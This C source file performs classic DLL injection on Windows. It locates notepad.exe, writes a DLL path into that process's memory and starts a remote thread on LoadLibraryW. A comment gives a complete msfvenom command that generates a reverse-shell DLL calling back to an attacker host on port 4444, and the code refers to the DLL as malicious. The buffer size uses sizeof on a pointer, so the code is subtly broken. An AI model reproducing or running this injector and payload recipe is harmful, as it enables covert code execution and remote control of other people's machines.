#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

// wchat_t* is used for UTF-16 character space.
int getProcessId(HANDLE snapshot, wchar_t* processName) {
	PROCESSENTRY32 processEntry;
	// The size of the structure, in bytes.
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	BOOL success = Process32First(snapshot, &processEntry);
	
	// Could not find a process.
	if (!success)
		return -2;

	while (success) {
		// wcscmp is used to compare UTF-16 strings.
		if (wcscmp(processEntry.szExeFile, processName) == 0)
			return processEntry.th32ProcessID;

		success = Process32Next(snapshot, &processEntry);
	}

	return -1;
}

int main(int argc, char** argv) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	// TEXT is used to create UTF-16 strings.
	int processId = getProcessId(snapshot, TEXT("notepad.exe"));
	printf("Process Id: %d\n", processId);
	CloseHandle(snapshot);

	HANDLE notepad = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

	// msfvenom --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.x.y LPORT=4444 EXITFUNC=thread -f dll -o reverse_shell.dll
	wchar_t* dllPath = TEXT("PATH OF THE MALICIOUS DLL");

	LPVOID allocatedBuffer = VirtualAllocEx(notepad, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);

	if (allocatedBuffer) {
		WriteProcessMemory(notepad, allocatedBuffer, (LPVOID) dllPath, sizeof dllPath, NULL);

		PTHREAD_START_ROUTINE startRoutine = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

		CreateRemoteThread(notepad, NULL, 0, startRoutine, allocatedBuffer, 0, NULL);
	}

	CloseHandle(notepad);
	return 0;
}
